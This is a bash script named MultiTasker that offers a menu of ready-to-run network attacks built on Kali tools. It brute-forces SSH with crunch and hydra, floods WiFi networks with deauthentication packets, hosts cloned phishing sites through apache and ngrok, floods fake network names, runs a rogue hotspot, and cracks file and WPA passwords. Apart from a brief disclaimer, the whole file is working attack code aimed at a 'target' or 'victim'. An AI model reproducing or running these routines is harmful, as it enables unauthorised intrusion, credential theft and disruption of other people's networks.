#ScriptName
RED="\e[31m"
ORANGE="\e[33m"
BLUE="\e[94m"
GREEN="\e[92m"
STOP="\e[0m"

printf "${GREEN}"
printf "==================================================\n"
printf "${RED}"
figlet -w 200 -f standard "MultiTasker"
printf "${GREEN}"
printf "==================================================\n"
printf "${STOP}"
#Fonts
bold=$(tput bold)
normal=$(tput sgr0)
#Opcje
printf "${RED}"$bold
echo Hello in MultiTasker it got much usefull option to help you in work
echo Please dont use this tool non Ethical thing and
echo I am not responsible for people who wield evil with my tool.
echo Author of this Mini tool is Piotr Sobczyk
echo 1] SSHExploiter "-----"  5] FakesNetwork "-----"
echo 2] Dos_on_WiFi "------"  6] FakeHotspot "------"
echo 3] HostScan "---------"  7] FileRipper "-------"
echo 4] PhantomPhisher "---"  8] WiFi_Passer "------"
echo Which option do you choose?:
printf "${STOP}"
read Options
#Functions
  SSHExploiter()
  {
  echo This is a script that creates a dictionary and then uses it for password cracking v1.1
  echo The minimum number of letters in a word
  read Minimum
  echo Maximum number of letters in a word.
  read Maximum
  echo Enter the characters, letters, and numbers you want to use
  read Characters
  echo What should be the name of the TXT file?
  read Name
  echo "    "
  sudo crunch $Minimum $Maximum $Characters -o $Name.txt
  sleep 1
  echo Below is the network gateway address that is needed. A password may be required!
  sleep 1
  sudo route -n
  echo Provide the network gateway address.
  read IP
  echo Starting Nmap
  sleep 1
  sudo nmap -p 22 $IP/24
  sleep 1
  echo Which IP address do you want to target for an attack
  read Target
  sleep 1
  echo I am starting to attack the specified target...
  sudo hydra -L $Name.txt -P $Name.txt ssh://$Target
  echo The attack has been successfully completed.
}
  Dos_on_WiFi()
  {
  echo Hello, this is a script for Denial of Service DoS attacks on a WiFi network.
  echo Tell me on which interface you gonna work?
  read interface
  echo On which channel your is working?
  read Channel
  sudo airmon-ng start $interface
  sudo iwconfig $interface channel $Channel
  echo How MUCH you want to send Deauthentication packets
  read Packets
  echo what is mac address of your target wifi
  read Mac
  sudo aireplay-ng -0 $Packets -a $Mac --ignore-negative-one $interface
  sudo ifconfig $interface down
  sudo airmon-ng stop wlan0
  sudo ifconfig $interface up
}
  HostScan()
  {
  echo Give me the IP address of the network gateway.
  read gateway
  sudo nmap -sP $gateway/24
  echo "   "
  echo "   "
  echo "   "
  echo Which IP address would you like to scan?
  read IP
  sudo nmap -sP $IP
  echo Task completed
}
  PhantomPhisher()
  {
  echo Its Phisher script to MultiTasker
  echo What Which website do you want to counterfeit?
  read website
  mkdir $website
  cd $website
  touch index.html
  echo You have to add source code of website manually
  echo Enter Ready if you are ready do continue. Perhaps a password will be required
  read AreYouReady
  if [ "$AreYouReady" = "Ready" ]; then
    sudo service apache2 start
    sudo cp index.html /var/www/html/index.html
    cd /home/kali/Pulpit
    sudo ./ngrok http 80
    sudo rm /var/www/html/index.html
    sudo service apache2 stop
  else
    echo You cannot proceed with any word other than Ready
  fi
  echo Task Complete
}
FakesNetwork()
{
  echo What Wifi interface are you using?
  read Interface
  echo Second question do you have installed tool named mdk4?
  echo Type yes if you have or type No if you dont have
  read Tools
  if [ "$Tools" = "yes" ];then
    echo The next question is, do you have a dictionary with network names?
    echo If you have type YES or IF YOU DONT HAVE IT , go and create. VERY Important things is file with Wifi name must
    echo end with lst FOR EXAMPLE name.lst and in file with name you can give 2 same name
    read Slownik
    if [ "$Slownik" = "yes" ]; then
      echo Type path to dictionary with WiFi names
      read PathToNames
      sudo airmon-ng start $Interface
      echo Almost everything is ready
      echo I recommend typing sudo Airodump-ng wlan0 to see whats happening
      sudo mdk4 $Interface b -f $PathToNames
    fi
  fi
}

FakeHotspot()
{
  echo Hello its one from much options in MultiTasker Tool
  echo Ok , i have a few question
  echo what Wifi interface are you using?
  read Interfaces
  sudo ifconfig $Interfaces 192.168.150.1
  sudo service dnsmasq restart
  sleep 3
  echo Enabling routing
  sudo sysctl net.ipv4.ip_forward=1
  echo Enabling NAT
  sleep 2
  sudo iptables -t nat -A POSTROUTING -o ppp0 -j MASQUERADE
  echo Running acces point
  sleep 3
  sudo sudo hostapd /etc/hostapd.conf
  echo Type END to end
  read END
  if [ "$END" = "End" ]; then
    echo Turning off NAT
    sleep 3
    sudo iptables -D POSTROUTING -t nat -o ppp0 -j MASQUERADE
    echo Turning off routing
    sleep 3
    sudo sysctl net.ipv4.ip_forward=0
    echo Turning off DHCP/DNS server
    sudo service dnsmasq stop
    sudo service hostapd stop
    echo Thank you for using my tool
    echo Turning off MultiTasker
    sleep 3
    exit
  fi
 }

 FileRipper()
{
 echo Hello its FileRipper. I have few question for you
 echo First question, How is your cracking file named?
 read FileName
 echo What type is your file?
 read FileType
 echo Second question , could you give path to file to CRACK?
 read PathToFile
 echo Hash is generated in your terminal location FOR EXAMPLE you are in termial loction Desktop then hash will be generated on Desktop
 echo Last question how do you want name hash file?
 read HashName
 echo The end of these boring questions, now comes the more interesting part
 sudo "$FileType"2john $FileName > $HashName
 echo Johny has a hash now he needs to crack it
 sudo john $HashName
 echo Thanks for using MultiTasker
}

  WiFi_Passer()
  {
    echo Hi its one WiFi Passer very good WiFi cracking Tool
    echo what WiFi interface you are using?
    read Interface
    echo Turning ON your Interface to Monitor mode
    sleep 1
    sudo airmon-ng start $Interface
    sleep 1
    echo you need to remeber or note somewhere BSSID and channel
    sudo airodump-ng $Interface
    echo I need to know Vicitim wifi BSSID
    read BSSID
    echo now tell me on which channel your target is?
    read channel
    echo and path to dictionary with Passwords IMPORTANT THING is if you have path like that /home/kali/Desktop its ok but type
    echo like that /home/kali/Desktop/NameOfDictionary
    read PathToDictionary
    echo Last thing is name of your WiFi interface in Monitor mode
    read MonInterface
    echo Remeber if nobody is connected to victim network you cant crack password with out HANDSHAKE
    echo you must  to Open another Tab and use Airodump-ng and Remember that after entering this,
    echo everyone on the network will be disconnected and wont be able to reconnect
    echo to use Airodump-ng then use exacly this command and handshake "sudo airodump-ng -w [Name of handshake] -c [Your channel] --bssid [Your BSSID] [YourInterface in Monitor]"
    echo Give me Name of your exacly generated handshake name i mean FOR EXAMPLE handshake-01.cap
    read Handshake
    echo Are you Ready? "(Type exacly Yes big Y and small es)"
    read Ready
    if [ "$Ready" = "Yes" ]; then
      sudo aireplay-ng --deauth 0 -a $BSSID $MonInterface
        sudo aircrack-ng "$Handshake" -w $PathToDictionary
        echo Passoword is Passed
    fi
  }



if [ "$Options" = "1" ]; then
  SSHExploiter
elif [ "$Options" = "2" ]; then
  Dos_on_WiFi
elif [ "$Options" = "3" ]; then
  HostScan
elif [ "$Options" = "4" ]; then
  PhantomPhisher
elif [ "$Options" = "5" ]; then
  FakesNetwork
elif [ "$Options" = "6" ]; then
  FakeHotspot
elif [ "$Options" = "7" ]; then
  FileRipper
elif [ "$Options" = "8" ]; then
  WiFi_Passer
else
  echo There is no such option to choose
fi
